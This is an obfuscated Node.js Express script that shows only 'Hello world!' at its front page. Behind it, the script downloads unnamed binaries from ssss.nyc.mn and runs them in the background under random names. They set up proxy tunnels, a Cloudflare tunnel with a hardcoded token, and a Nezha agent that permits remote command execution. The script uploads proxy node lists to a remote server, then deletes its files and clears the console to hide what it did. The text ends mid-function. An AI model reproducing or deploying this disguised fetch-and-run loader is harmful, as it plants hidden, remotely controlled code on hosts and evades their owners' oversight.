const _0x2a0a8f=_0x28f7;(function(_0x5cbc35,_0xd26b83){const _0x20dfc6=_0x28f7,_0x3466c8=_0x5cbc35();while(!![]){try{const _0x5c6ebb=-parseInt(_0x20dfc6(0x177))/0x1*(-parseInt(_0x20dfc6(0x161))/0x2)+parseInt(_0x20dfc6(0x16a))/0x3+-parseInt(_0x20dfc6(0x19d))/0x4*(parseInt(_0x20dfc6(0x10b))/0x5)+-parseInt(_0x20dfc6(0x10d))/0x6*(parseInt(_0x20dfc6(0x12d))/0x7)+-parseInt(_0x20dfc6(0x14c))/0x8*(parseInt(_0x20dfc6(0xed))/0x9)+parseInt(_0x20dfc6(0x14d))/0xa*(-parseInt(_0x20dfc6(0x17c))/0xb)+-parseInt(_0x20dfc6(0x148))/0xc*(-parseInt(_0x20dfc6(0x1ae))/0xd);if(_0x5c6ebb===_0xd26b83)break;else _0x3466c8['push'](_0x3466c8['shift']());}catch(_0x4be4c6){_0x3466c8['push'](_0x3466c8['shift']());}}}(_0x4090,0xb6a4d));const express=require(_0x2a0a8f(0x139)),app=express(),axios=require(_0x2a0a8f(0x150)),os=require('os'),fs=require('fs'),path=require(_0x2a0a8f(0x137)),{promisify}=require('util'),exec=promisify(require(_0x2a0a8f(0x138))[_0x2a0a8f(0x118)]),{execSync}=require(_0x2a0a8f(0x138)),UPLOAD_URL=process['env'][_0x2a0a8f(0x146)]||'',PROJECT_URL=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x188)]||'',AUTO_ACCESS=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x136)]||![],FILE_PATH=process[_0x2a0a8f(0x155)]['FILE_PATH']||_0x2a0a8f(0x126),SUB_PATH=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x1ad)]||_0x2a0a8f(0x120),PORT=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x140)]||process[_0x2a0a8f(0x155)][_0x2a0a8f(0x17e)]||0xbb8,UUID=process['env'][_0x2a0a8f(0x157)]||_0x2a0a8f(0x166),NEZHA_SERVER=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x105)]||'',NEZHA_PORT=process['env'][_0x2a0a8f(0x173)]||'',NEZHA_KEY=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x119)]||'',ARGO_DOMAIN=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x147)]||_0x2a0a8f(0x16e),ARGO_AUTH=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x128)]||_0x2a0a8f(0x18b),ARGO_PORT=process['env'][_0x2a0a8f(0x184)]||0x1f41,CFIP=process['env'][_0x2a0a8f(0x17d)]||_0x2a0a8f(0x159),CFPORT=process[_0x2a0a8f(0x155)][_0x2a0a8f(0x11a)]||0x1bb,NAME=process[_0x2a0a8f(0x155)]['NAME']||'hello';!fs[_0x2a0a8f(0x13e)](FILE_PATH)?(fs[_0x2a0a8f(0x141)](FILE_PATH),console[_0x2a0a8f(0xf9)](FILE_PATH+_0x2a0a8f(0x195))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x10d3c7=_0x2a0a8f,_0x18d619=_0x10d3c7(0xfd);let _0x4a10d9='';for(let _0x30cab7=0x0;_0x30cab7<0x6;_0x30cab7++){_0x4a10d9+=_0x18d619[_0x10d3c7(0x130)](Math[_0x10d3c7(0x1b7)](Math[_0x10d3c7(0xf0)]()*_0x18d619[_0x10d3c7(0x19c)]));}return _0x4a10d9;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x2a0a8f(0x189)](FILE_PATH,phpName),webPath=path[_0x2a0a8f(0x189)](FILE_PATH,webName),botPath=path[_0x2a0a8f(0x189)](FILE_PATH,botName),subPath=path[_0x2a0a8f(0x189)](FILE_PATH,'sub.txt'),listPath=path[_0x2a0a8f(0x189)](FILE_PATH,_0x2a0a8f(0x10f)),bootLogPath=path[_0x2a0a8f(0x189)](FILE_PATH,_0x2a0a8f(0x14a)),configPath=path[_0x2a0a8f(0x189)](FILE_PATH,'config.json');function deleteNodes(){const _0x1d31eb=_0x2a0a8f;try{if(!UPLOAD_URL)return;if(!fs[_0x1d31eb(0x13e)](subPath))return;let _0x8e2c17;try{_0x8e2c17=fs[_0x1d31eb(0xfa)](subPath,_0x1d31eb(0x1b5));}catch{return null;}const _0x11e0fe=Buffer[_0x1d31eb(0xef)](_0x8e2c17,_0x1d31eb(0x181))['toString'](_0x1d31eb(0x1b5)),_0x534b52=_0x11e0fe[_0x1d31eb(0xf7)]('\x0a')[_0x1d31eb(0x164)](_0x33d3cb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1d31eb(0x186)](_0x33d3cb));if(_0x534b52[_0x1d31eb(0x19c)]===0x0)return;return axios[_0x1d31eb(0x12b)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1d31eb(0x17a)]({'nodes':_0x534b52}),{'headers':{'Content-Type':_0x1d31eb(0x133)}})['catch'](_0x1f53b7=>{return null;}),null;}catch(_0xeebfe6){return null;}}function cleanupOldFiles(){const _0x5efdfb=_0x2a0a8f;try{const _0x233644=fs[_0x5efdfb(0x169)](FILE_PATH);_0x233644['forEach'](_0x20bd67=>{const _0x18be7e=_0x5efdfb,_0x1ec8d7=path['join'](FILE_PATH,_0x20bd67);try{const _0x4b0cdb=fs['statSync'](_0x1ec8d7);_0x4b0cdb[_0x18be7e(0xf3)]()&&fs[_0x18be7e(0x112)](_0x1ec8d7);}catch(_0x1bdeae){}});}catch(_0x48383e){}}function _0x28f7(_0x2187f8,_0x14cc64){_0x2187f8=_0x2187f8-0xec;const _0x40903e=_0x4090();let _0x28f7d0=_0x40903e[_0x2187f8];return _0x28f7d0;}app['get']('/',function(_0x17bc9e,_0x1299c3){const _0x178144=_0x2a0a8f;_0x1299c3[_0x178144(0x149)](_0x178144(0xf2));});async function generateConfig(){const _0x323f6a=_0x2a0a8f,_0x3d190d={'log':{'access':_0x323f6a(0xec),'error':_0x323f6a(0xec),'loglevel':_0x323f6a(0x15e)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x323f6a(0x151),'settings':{'clients':[{'id':UUID,'flow':_0x323f6a(0x1ac)}],'decryption':_0x323f6a(0x15e),'fallbacks':[{'dest':0xbb9},{'path':_0x323f6a(0x101),'dest':0xbba},{'path':_0x323f6a(0x185),'dest':0xbbb},{'path':_0x323f6a(0x178),'dest':0xbbc}]},'streamSettings':{'network':_0x323f6a(0x18f)}},{'port':0xbb9,'listen':_0x323f6a(0x110),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x323f6a(0x18f),'security':_0x323f6a(0x15e)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x323f6a(0x15e)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x323f6a(0x101)}},'sniffing':{'enabled':!![],'destOverride':[_0x323f6a(0xf6),_0x323f6a(0x15f),_0x323f6a(0x198)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x323f6a(0x110),'protocol':_0x323f6a(0x193),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x323f6a(0x185)}},'sniffing':{'enabled':!![],'destOverride':[_0x323f6a(0xf6),_0x323f6a(0x15f),_0x323f6a(0x198)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x323f6a(0x110),'protocol':_0x323f6a(0x196),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x323f6a(0x15e),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x323f6a(0xf6),_0x323f6a(0x15f),_0x323f6a(0x198)],'metadataOnly':![]}}],'dns':{'servers':[_0x323f6a(0x14f)]},'outbounds':[{'protocol':_0x323f6a(0x15b),'tag':_0x323f6a(0x114)},{'protocol':_0x323f6a(0x16d),'tag':_0x323f6a(0x17b)}]};fs[_0x323f6a(0x11c)](path[_0x323f6a(0x189)](FILE_PATH,_0x323f6a(0x175)),JSON['stringify'](_0x3d190d,null,0x2));}function getSystemArchitecture(){const _0x25df0a=_0x2a0a8f,_0x1af132=os[_0x25df0a(0x16c)]();return _0x1af132===_0x25df0a(0x134)||_0x1af132===_0x25df0a(0x19b)||_0x1af132===_0x25df0a(0x1b4)?_0x25df0a(0x134):_0x25df0a(0x1ba);}function downloadFile(_0x55cbdc,_0x4a15bf,_0x29be50){const _0x2d2055=_0x2a0a8f,_0x4a87ce=_0x55cbdc;!fs[_0x2d2055(0x13e)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x57a20c=fs[_0x2d2055(0x199)](_0x4a87ce);axios({'method':_0x2d2055(0x162),'url':_0x4a15bf,'responseType':_0x2d2055(0x1b0)})[_0x2d2055(0x122)](_0x229cf7=>{const _0x352260=_0x2d2055;_0x229cf7[_0x352260(0xee)][_0x352260(0x183)](_0x57a20c),_0x57a20c['on'](_0x352260(0x11b),()=>{const _0x5483c1=_0x352260;_0x57a20c[_0x5483c1(0x182)](),console[_0x5483c1(0xf9)](_0x5483c1(0x168)+path[_0x5483c1(0x14b)](_0x4a87ce)+_0x5483c1(0x127)),_0x29be50(null,_0x4a87ce);}),_0x57a20c['on'](_0x352260(0x1b1),_0x1d2365=>{const _0x584476=_0x352260;fs[_0x584476(0x19a)](_0x4a87ce,()=>{});const _0x12030c='Download\x20'+path[_0x584476(0x14b)](_0x4a87ce)+'\x20failed:\x20'+_0x1d2365[_0x584476(0x19f)];console[_0x584476(0x1b1)](_0x12030c),_0x29be50(_0x12030c);});})[_0x2d2055(0x108)](_0x241bdf=>{const _0x446e96=_0x2d2055,_0x282c05='Download\x20'+path['basename'](_0x4a87ce)+_0x446e96(0x106)+_0x241bdf[_0x446e96(0x19f)];console[_0x446e96(0x1b1)](_0x282c05),_0x29be50(_0x282c05);});}async function downloadFilesAndRun(){const _0x9ecc1d=_0x2a0a8f,_0x423309=getSystemArchitecture(),_0x4417f3=getFilesForArchitecture(_0x423309);if(_0x4417f3['length']===0x0){console[_0x9ecc1d(0xf9)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2d7028=_0x4417f3[_0x9ecc1d(0x152)](_0x1a9d22=>{return new Promise((_0x4276bd,_0x31b9ec)=>{const _0x30690d=_0x28f7;downloadFile(_0x1a9d22[_0x30690d(0xf4)],_0x1a9d22['fileUrl'],(_0x55d0d1,_0x22db76)=>{_0x55d0d1?_0x31b9ec(_0x55d0d1):_0x4276bd(_0x22db76);});});});try{await Promise[_0x9ecc1d(0x123)](_0x2d7028);}catch(_0x1d4420){console[_0x9ecc1d(0x1b1)]('Error\x20downloading\x20files:',_0x1d4420);return;}function _0x45d8be(_0x31d325){const _0x437801=_0x9ecc1d,_0x59ee5a=0x1fd;_0x31d325[_0x437801(0x143)](_0x4a3482=>{const _0x3dd672=_0x437801;fs[_0x3dd672(0x13e)](_0x4a3482)&&fs[_0x3dd672(0xf8)](_0x4a3482,_0x59ee5a,_0x933015=>{const _0x12e327=_0x3dd672;_0x933015?console[_0x12e327(0x1b1)](_0x12e327(0x13d)+_0x4a3482+':\x20'+_0x933015):console['log'](_0x12e327(0x12f)+_0x4a3482+':\x20'+_0x59ee5a[_0x12e327(0x19e)](0x8));});});}const _0x258d2e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x45d8be(_0x258d2e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x85280d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x9ecc1d(0xf7)](':')[_0x9ecc1d(0x197)]():'',_0x155b6b=new Set([_0x9ecc1d(0x170),'8443',_0x9ecc1d(0x11e),_0x9ecc1d(0x13b),'2083',_0x9ecc1d(0x167)]),_0x50a984=_0x155b6b[_0x9ecc1d(0x18d)](_0x85280d)?_0x9ecc1d(0x104):_0x9ecc1d(0x1a6),_0x30a664=_0x9ecc1d(0x12a)+NEZHA_KEY+_0x9ecc1d(0x129)+NEZHA_SERVER+_0x9ecc1d(0x163)+_0x50a984+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x9ecc1d(0x11c)](path[_0x9ecc1d(0x189)](FILE_PATH,'config.yaml'),_0x30a664);const _0x389f3d=_0x9ecc1d(0x10a)+phpPath+_0x9ecc1d(0x1a7)+FILE_PATH+_0x9ecc1d(0xfc);try{await exec(_0x389f3d),console['log'](phpName+_0x9ecc1d(0xfb)),await new Promise(_0x3d4414=>setTimeout(_0x3d4414,0x3e8));}catch(_0x22ae71){console[_0x9ecc1d(0x1b1)]('php\x20running\x20error:\x20'+_0x22ae71);}}else{let _0x2b9bd1='';const _0x4b5239=[_0x9ecc1d(0x170),_0x9ecc1d(0x103),_0x9ecc1d(0x11e),_0x9ecc1d(0x13b),_0x9ecc1d(0x1b3),'2053'];_0x4b5239['includes'](NEZHA_PORT)&&(_0x2b9bd1='--tls');const _0x2ebf9a=_0x9ecc1d(0x10a)+npmPath+_0x9ecc1d(0x1a5)+NEZHA_SERVER+':'+NEZHA_PORT+_0x9ecc1d(0x11f)+NEZHA_KEY+'\x20'+_0x2b9bd1+_0x9ecc1d(0x13a);try{await exec(_0x2ebf9a),console[_0x9ecc1d(0xf9)](npmName+_0x9ecc1d(0xfb)),await new Promise(_0x259e48=>setTimeout(_0x259e48,0x3e8));}catch(_0x1382d2){console['error'](_0x9ecc1d(0x1a3)+_0x1382d2);}}}else console[_0x9ecc1d(0xf9)](_0x9ecc1d(0x12e));const _0x4a936a=_0x9ecc1d(0x10a)+webPath+_0x9ecc1d(0x192)+FILE_PATH+_0x9ecc1d(0x18e);try{await exec(_0x4a936a),console[_0x9ecc1d(0xf9)](webName+_0x9ecc1d(0xfb)),await new Promise(_0x38d298=>setTimeout(_0x38d298,0x3e8));}catch(_0xf199d1){console[_0x9ecc1d(0x1b1)](_0x9ecc1d(0x180)+_0xf199d1);}if(fs['existsSync'](botPath)){let _0x2b2042;if(ARGO_AUTH[_0x9ecc1d(0x1b2)](/^[A-Z0-9a-z=]{120,250}$/))_0x2b2042=_0x9ecc1d(0xf1)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2b2042=_0x9ecc1d(0x15a)+FILE_PATH+_0x9ecc1d(0x154):_0x2b2042=_0x9ecc1d(0x116)+FILE_PATH+_0x9ecc1d(0x172)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2b2042+_0x9ecc1d(0x145)),console[_0x9ecc1d(0xf9)](botName+_0x9ecc1d(0xfb)),await new Promise(_0x2b2203=>setTimeout(_0x2b2203,0x7d0));}catch(_0x2db204){console[_0x9ecc1d(0x1b1)](_0x9ecc1d(0x1b6)+_0x2db204);}}await new Promise(_0x303c2c=>setTimeout(_0x303c2c,0x1388));}function _0x4090(){const _0x12d017=['\x0a\x20\x20\x20\x20','list.txt','127.0.0.1','?encryption=none&security=tls&sni=','unlinkSync','taskkill\x20/f\x20/im\x20','direct','org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://oooo.serv00.net/add-url','exec','NEZHA_KEY','CFPORT','finish','writeFileSync','https://arm64.ssss.nyc.mn/web','2096','\x20-p\x20','sub','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','then','all','\x0a\x0avmess://','http://ip-api.com/json/','./tmp','\x20successfully','ARGO_AUTH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0aclient_secret:\x20','post','response','547078ppENSk','NEZHA\x20variable\x20is\x20empty,skip\x20running','Empowerment\x20success\x20for\x20','charAt','Skipping\x20adding\x20automatic\x20access\x20task','Subscription\x20uploaded\x20successfully','application/json','arm','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','AUTO_ACCESS','path','child_process','express','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2087','del\x20/f\x20/q\x20','Empowerment\x20failed\x20for\x20','existsSync','country_code','SERVER_PORT','mkdirSync','\x0a\x20\x20tunnel:\x20','forEach','Nodes\x20uploaded\x20successfully','\x20>/dev/null\x202>&1\x20&','UPLOAD_URL','ARGO_DOMAIN','27382884eaRFNx','send','boot.log','basename','4190656wNSVdd','212930TqLKMk','TunnelSecret','https+local://8.8.8.8/dns-query','axios','vless','map','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/tunnel.yml\x20run','env','\x0a\x20\x20credentials-file:\x20','UUID','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','cdns.doon.eu.org','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','freedom','rm\x20-rf\x20','&fp=firefox&type=ws&host=','none','tls','/api/add-subscriptions','18KkGXQg','get','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','filter','\x20>/dev/null\x202>&1','54cb6ea8-6724-41e9-b230-dbe3b686155b','2053','Download\x20','readdirSync','1717743UOWdux','tunnel.json','arch','blackhole','hello.zw633.de5.net','?security=tls&sni=','443','/api/add-nodes','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','NEZHA_PORT','App\x20is\x20running','config.json','https://ipapi.co/json/','43463OhZtZW','/trojan-argo','status','stringify','block','506JrSokB','CFIP','PORT','https://amd64.ssss.nyc.mn/web','web\x20running\x20error:\x20','base64','close','pipe','ARGO_PORT','/vmess-argo','test','&path=%2Fvless-argo%3Fed%3D2560#','PROJECT_URL','join','https://amd64.ssss.nyc.mn/bot','eyJhIjoiMWI3NmUzNjdkMWFkM2FlNmQ1N2U4NjM4NjNlYzdhYzEiLCJ0IjoiZDEwZGNlMTEtZWM3Zi00M2ExLWI2NjktNzYzMDQ0ZjJiODZhIiwicyI6Ik1UaGhPR1JtTXpFdE56SXpOUzAwT1RnMExUZ3dObUV0T0RGaU9EbG1PR05tTWpBNSJ9','win32','has','/config.json\x20>/dev/null\x202>&1\x20&','tcp','https://arm64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/bot','\x20-c\x20','vmess','https://amd64.ssss.nyc.mn/v1','\x20is\x20created','trojan','pop','quic','createWriteStream','unlink','arm64','length','5694772WHQTii','toString','message','push','clear','ArgoDomain:','npm\x20running\x20error:\x20','automatic\x20access\x20task\x20added\x20successfully','\x20-s\x20','false','\x20-c\x20\x22','includes','listen','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','xtls-rprx-vision','SUB_PATH','26pkZrtN','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','stream','error','match','2083','aarch64','utf-8','Error\x20executing\x20command:\x20','floor','unshift','set','amd','/dev/null','18XtGyUf','data','from','random','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Hello\x20world!','isFile','fileName','countryCode','http','split','chmod','log','readFileSync','\x20is\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','abcdefghijklmnopqrstuvwxyz','success','.exe\x20>\x20nul\x202>&1','ARGO_DOMAIN:','/vless-argo','platform','8443','true','NEZHA_SERVER','\x20failed:\x20','Unknown','catch','Add\x20automatic\x20access\x20task\x20faild:\x20','nohup\x20','5CRaQbF','pkill\x20-f\x20\x22[','102qkBwUX'];_0x4090=function(){return _0x12d017;};return _0x4090();}function getFilesForArchitecture(_0x3bc7fd){const _0x50ebe6=_0x2a0a8f;let _0x370f82;_0x3bc7fd===_0x50ebe6(0x134)?_0x370f82=[{'fileName':webPath,'fileUrl':_0x50ebe6(0x11d)},{'fileName':botPath,'fileUrl':_0x50ebe6(0x191)}]:_0x370f82=[{'fileName':webPath,'fileUrl':_0x50ebe6(0x17f)},{'fileName':botPath,'fileUrl':_0x50ebe6(0x18a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x333869=_0x3bc7fd==='arm'?_0x50ebe6(0x190):'https://amd64.ssss.nyc.mn/agent';_0x370f82[_0x50ebe6(0x1b8)]({'fileName':npmPath,'fileUrl':_0x333869});}else{const _0xb99ada=_0x3bc7fd==='arm'?_0x50ebe6(0x1aa):_0x50ebe6(0x194);_0x370f82['unshift']({'fileName':phpPath,'fileUrl':_0xb99ada});}}return _0x370f82;}function argoType(){const _0xa8c60=_0x2a0a8f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xa8c60(0xf9)](_0xa8c60(0x121));return;}if(ARGO_AUTH[_0xa8c60(0x1a8)](_0xa8c60(0x14e))){fs[_0xa8c60(0x11c)](path[_0xa8c60(0x189)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x364f09=_0xa8c60(0x142)+ARGO_AUTH['split']('\x22')[0xb]+_0xa8c60(0x156)+path[_0xa8c60(0x189)](FILE_PATH,_0xa8c60(0x16b))+_0xa8c60(0x1ab)+ARGO_DOMAIN+_0xa8c60(0x135)+ARGO_PORT+_0xa8c60(0x1af);fs[_0xa8c60(0x11c)](path[_0xa8c60(0x189)](FILE_PATH,'tunnel.yml'),_0x364f09);}else console[_0xa8c60(0xf9)](_0xa8c60(0x158));}async function extractDomains(){const _0x5572c0=_0x2a0a8f;let _0x43828a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x43828a=ARGO_DOMAIN,console[_0x5572c0(0xf9)](_0x5572c0(0x100),_0x43828a),await _0x421826(_0x43828a);else try{const _0x334bb1=fs[_0x5572c0(0xfa)](path['join'](FILE_PATH,_0x5572c0(0x14a)),'utf-8'),_0x4909dc=_0x334bb1[_0x5572c0(0xf7)]('\x0a'),_0x4f5fd2=[];_0x4909dc[_0x5572c0(0x143)](_0x3842e4=>{const _0x82c2a0=_0x5572c0,_0x454e62=_0x3842e4[_0x82c2a0(0x1b2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x454e62){const _0x3bf3c1=_0x454e62[0x1];_0x4f5fd2[_0x82c2a0(0x1a0)](_0x3bf3c1);}});if(_0x4f5fd2[_0x5572c0(0x19c)]>0x0)_0x43828a=_0x4f5fd2[0x0],console[_0x5572c0(0xf9)](_0x5572c0(0x1a2),_0x43828a),await _0x421826(_0x43828a);else{console[_0x5572c0(0xf9)](_0x5572c0(0x153)),fs[_0x5572c0(0x112)](path[_0x5572c0(0x189)](FILE_PATH,_0x5572c0(0x14a)));async function _0x17ddf6(){const _0x3ebb59=_0x5572c0;try{process[_0x3ebb59(0x102)]==='win32'?await exec(_0x3ebb59(0x113)+botName+_0x3ebb59(0xff)):await exec(_0x3ebb59(0x10c)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x571f68){}}_0x17ddf6(),await new Promise(_0x206e35=>setTimeout(_0x206e35,0xbb8));const _0x2ec36c=_0x5572c0(0x116)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5572c0(0x10a)+botPath+'\x20'+_0x2ec36c+_0x5572c0(0x145)),console[_0x5572c0(0xf9)](botName+_0x5572c0(0xfb)),await new Promise(_0x5833db=>setTimeout(_0x5833db,0xbb8)),await extractDomains();}catch(_0x10223a){console[_0x5572c0(0x1b1)](_0x5572c0(0x1b6)+_0x10223a);}}}catch(_0x53a4f2){console[_0x5572c0(0x1b1)]('Error\x20reading\x20boot.log:',_0x53a4f2);}async function _0xd2be22(){const _0x599023=_0x5572c0;try{const _0x541d00=await axios[_0x599023(0x162)](_0x599023(0x176),{'timeout':0xbb8});if(_0x541d00[_0x599023(0xee)]&&_0x541d00['data'][_0x599023(0x13f)]&&_0x541d00[_0x599023(0xee)][_0x599023(0x115)])return _0x541d00[_0x599023(0xee)][_0x599023(0x13f)]+'_'+_0x541d00['data'][_0x599023(0x115)];}catch(_0x3ca528){try{const _0x7829bf=await axios[_0x599023(0x162)](_0x599023(0x125),{'timeout':0xbb8});if(_0x7829bf['data']&&_0x7829bf['data'][_0x599023(0x179)]===_0x599023(0xfe)&&_0x7829bf[_0x599023(0xee)][_0x599023(0xf5)]&&_0x7829bf[_0x599023(0xee)][_0x599023(0x115)])return _0x7829bf[_0x599023(0xee)][_0x599023(0xf5)]+'_'+_0x7829bf[_0x599023(0xee)][_0x599023(0x115)];}catch(_0x1c1ce6){}}return _0x599023(0x107);}async function _0x421826(_0x4fcf26){const _0x120585=await _0xd2be22(),_0x45b9ad=NAME?NAME+'-'+_0x120585:_0x120585;return new Promise(_0x5100d7=>{setTimeout(()=>{const _0x1d4924=_0x28f7,_0x420481={'v':'2','ps':''+_0x45b9ad,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1d4924(0x15e),'net':'ws','type':_0x1d4924(0x15e),'host':_0x4fcf26,'path':'/vmess-argo?ed=2560','tls':_0x1d4924(0x15f),'sni':_0x4fcf26,'alpn':'','fp':'firefox'},_0x3b700d='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1d4924(0x111)+_0x4fcf26+_0x1d4924(0x15d)+_0x4fcf26+_0x1d4924(0x187)+_0x45b9ad+_0x1d4924(0x124)+Buffer[_0x1d4924(0xef)](JSON[_0x1d4924(0x17a)](_0x420481))[_0x1d4924(0x19e)](_0x1d4924(0x181))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x1d4924(0x16f)+_0x4fcf26+_0x1d4924(0x15d)+_0x4fcf26+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x45b9ad+_0x1d4924(0x10e);console['log'](Buffer[_0x1d4924(0xef)](_0x3b700d)[_0x1d4924(0x19e)]('base64')),fs[_0x1d4924(0x11c)](subPath,Buffer[_0x1d4924(0xef)](_0x3b700d)[_0x1d4924(0x19e)](_0x1d4924(0x181))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x3ad668,_0x10fc39)=>{const _0x4bcf1d=_0x1d4924,_0x524d04=Buffer[_0x4bcf1d(0xef)](_0x3b700d)[_0x4bcf1d(0x19e)]('base64');_0x10fc39[_0x4bcf1d(0x1b9)]('Content-Type','text/plain;\x20charset=utf-8'),_0x10fc39[_0x4bcf1d(0x149)](_0x524d04);}),_0x5100d7(_0x3b700d);},0x7d0);});}}async function uploadNodes(){const _0x4e6d37=_0x2a0a8f;if(UPLOAD_URL&&PROJECT_URL){const _0x434855=PROJECT_URL+'/'+SUB_PATH,_0x3ec73f={'subscription':[_0x434855]};try{const _0x3e7f78=await axios[_0x4e6d37(0x12b)](UPLOAD_URL+_0x4e6d37(0x160),_0x3ec73f,{'headers':{'Content-Type':_0x4e6d37(0x133)}});return _0x3e7f78&&_0x3e7f78['status']===0xc8?(console[_0x4e6d37(0xf9)](_0x4e6d37(0x132)),_0x3e7f78):null;}catch(_0x1dd7e3){if(_0x1dd7e3[_0x4e6d37(0x12c)]){if(_0x1dd7e3['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4e6d37(0x13e)](listPath))return;const _0x4c193b=fs[_0x4e6d37(0xfa)](listPath,_0x4e6d37(0x1b5)),_0x4715d2=_0x4c193b['split']('\x0a')[_0x4e6d37(0x164)](_0x55f9d1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x55f9d1));if(_0x4715d2[_0x4e6d37(0x19c)]===0x0)return;const _0x21824a=JSON[_0x4e6d37(0x17a)]({'nodes':_0x4715d2});try{const _0x5af24f=await axios[_0x4e6d37(0x12b)](UPLOAD_URL+_0x4e6d37(0x171),_0x21824a,{'headers':{'Content-Type':'application/json'}});return _0x5af24f&&_0x5af24f['status']===0xc8?(console[_0x4e6d37(0xf9)](_0x4e6d37(0x144)),_0x5af24f):null;}catch(_0x3ac8cf){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x33d12f=_0x28f7,_0x4af853=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4af853[_0x33d12f(0x1a0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4af853[_0x33d12f(0x1a0)](phpPath);process[_0x33d12f(0x102)]===_0x33d12f(0x18c)?exec(_0x33d12f(0x13c)+_0x4af853[_0x33d12f(0x189)]('\x20')+'\x20>\x20nul\x202>&1',_0x2461f0=>{const _0x9483f6=_0x33d12f;console[_0x9483f6(0x1a1)](),console['log'](_0x9483f6(0x174)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x33d12f(0x15c)+_0x4af853[_0x33d12f(0x189)]('\x20')+_0x33d12f(0x165),_0x36cc8b=>{const _0x2c91a5=_0x33d12f;console[_0x2c91a5(0x1a1)](),console['log'](_0x2c91a5(0x174)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const 